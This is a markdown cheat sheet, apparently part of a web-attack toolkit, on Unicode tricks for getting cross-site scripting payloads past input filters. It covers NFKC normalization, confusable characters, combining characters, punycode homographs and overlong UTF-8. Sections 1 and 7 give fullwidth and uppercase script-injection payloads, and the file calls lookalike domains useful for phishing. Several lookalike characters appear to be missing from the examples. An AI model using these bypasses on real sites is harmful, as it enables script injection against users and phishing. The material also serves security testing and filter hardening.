# Unicode and normalization — the character-set bypass layer

The second encoding frontier: Unicode points, normalization
(NFC/NFKC), confusable lookalikes, IDN homographs, and the
"one char became another" bugs.

---

## 1. The normalization trap — NFKC collapses lookalikes

```text
NFKC normalization maps:
  ｓ (fullwidth s, U+FF53) → s
  ｓｃｒｉｐｔ             → script
  ⁄ (fraction slash, U+2044) → /
  ｡ (halfwidth period, U+FF61) → .
```

If the filter normalizes THEN checks — your `＜script＞` (fullwidth)
normalizes to `<script>` AFTER the check. The check sees fullwidth
(not `<`), the renderer sees normalized (`<`).

```html
＜img src=x onerror=alert(1)＞       -- fullwidth < >
＜svg onload=alert(1)＞
‹img src=x onerror=alert(1)›         -- single-guillemet — no
                                    -- normalization needed, but
                                    -- also doesn't parse as tag
```

The critical detail: the normalized output must be re-parsed by
the browser — a filter normalizing for CHECKING but leaving the
original bytes for the browser means the fullwidth stays fullwidth
and never parses. The bypass needs the app itself to normalize-
then-render.

---

## 2. Confusable lookalikes — the homograph set

```javascript
// 'a' filtered → lookalikes that still letter-match:
lert(1)     -- Cyrillic  (U+0430)
ａlert(1)     -- fullwidth a
αlert(1)     -- Greek α
lert(1)    -- Latin-with-diacritic
```

These only work if the filter checks literal `alert` AND the
JS engine accepts the lookalike — it does NOT — `ａlert` is not
`alert` to JS. The lookalike trick is for DISPLAY-level spoofing
(phishing), not code execution. Skip for XSS payloads.

---

## 3. The combining-char family — `\u0300`-style overlays

```text
a\u0300 → à    a\u0301 → á    <\u0338 → ≮
```

Combining chars attach to the base char — `<`+combining-slash is
a DIFFERENT visual char. Some filters normalize-combining away,
leaving a bare `<`. Version-dependent, unreliable — try when
`filter-bypass.md` is exhausted.

---

## 4. The IDN/punycode angle — the URL-side

```text
xn-- domain names — the punycode form:
me.com → the ASCII domain
m.com → cyrillic  — punycode xn--m-6ub.com
```

For URL-attr contexts — a `href` pointing at a lookalike IDN passes
a "must be on target.com" check? No — the check compares strings,
the punycode DECODES to a different host. Useful for phishing,
useless for XSS (it's a different origin).

The real IDN-XSS case: a URL-parser bug where the displayed host
differs from the resolved host — browser-specific and rare.

---

## 5. The overlong-encoding set — UTF-8 malformed

```text
< = 0x3C — the UTF-8 canonical byte
< = 0xC0 0xBC — the 2-byte overlong — OLD browsers/servers decode
< = 0xE0 0x80 0xBC — the 3-byte overlong
```

Overlong UTF-8 was a WAF-bypass era technique — modern decoders
reject it (RFC 3629 forbids). Keep as a try-once-and-move-on.

---

## 6. The charset tricks — `encodings.md` cross-reference

UTF-7, UTF-16, charset-declaration attacks live in `encodings.md` —
the Unicode-layer file is for point-level tricks only.

---

## 7. The `eval`-inside-string normalization — a subtle one

```javascript
// a sanitizer that lowercases for the CHECK but leaves the
// original for the DOM:
<SCRIPT>alert(1)</SCRIPT>     -- survives lowercase-check
   -- browsers parse tags case-insensitively — the capital survives
   -- the filter checked 'script' but the DOM got 'SCRIPT' — works!
```

This is actually `filter-bypass.md` §1.1 territory — the uppercase
tag is the canonical answer. The Unicode file covers the POINT-level
tricks; the case-trick is a byte-level trick.

---

## 8. The window.name Unicode carrier — an encoding quirk

```javascript
// some browsers mangle UTF-16 surrogates in window.name:
// the carrier-encoded payload survives differently
// — a footnote for the carrier files, not a practical vector
```

---

## 9. The protocol — when to reach for Unicode

```text
1. the byte-level bypasses (filter-bypass.md) are dead
2. the server normalizes unicode somewhere (NFKC/NFC)
3. the check happens before normalization, render after
4. THEN unicode tricks are the layer to fuzz
```

`sanitizer_fuzz.py --families unicode,normalize` — the systematic
sweep for this layer.
